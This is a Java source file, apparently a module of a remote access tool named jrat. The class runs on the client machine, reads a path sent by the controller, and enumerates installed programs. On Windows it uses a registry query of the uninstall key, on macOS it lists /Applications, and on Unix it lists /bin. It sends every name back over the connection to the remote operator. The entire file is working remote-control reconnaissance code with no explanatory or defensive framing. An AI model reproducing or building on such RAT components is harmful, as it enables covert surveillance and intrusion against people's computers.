package jrat.module.system.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;
import oslib.OperatingSystem;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;


public class Packet81InstalledPrograms implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String path = con.readLine();
		try {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Process p;
				if (path.equalsIgnoreCase("hklm")) {
					p = Runtime.getRuntime().exec(new String[] { "reg", "query", "hklm\\software\\microsoft\\windows\\currentversion\\uninstall\\", "/s" });
				} else {
					p = Runtime.getRuntime().exec(new String[] { "reg", "query", path + "\\software\\microsoft\\windows\\currentversion\\uninstall\\", "/s" });
				}
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

				String line;

				while ((line = reader.readLine()) != null) {
					line = line.trim();
					if (path.equalsIgnoreCase("hklm")) {
						if (line.startsWith("DisplayName")) {
							String str = line.split("    ")[2];
							if (!str.startsWith("@")) {
								con.addToSendQueue(new Packet55InstalledProgram(str));
							}
						}
					} else {
						if (line.lastIndexOf("\\") != -1) {
							String str = line.substring(line.lastIndexOf("\\") + 1, line.length());
							con.addToSendQueue(new Packet55InstalledProgram(str));
						}
					}
				}
				reader.close();
			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
				File[] apps = new File("/Applications/").listFiles();

				for (File app : apps) {
					String name = app.getName();

					if (name.contains(".app")) {
						name = name.replace(".app", "");
						con.addToSendQueue(new Packet55InstalledProgram(name));
					}
				}
			} else if (OperatingSystem.isUnix()) {
			    File[] bins = new File("/bin").listFiles();

			    for (File bin : bins) {
			        con.addToSendQueue(new Packet55InstalledProgram(bin.getName()));
                }
            }
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
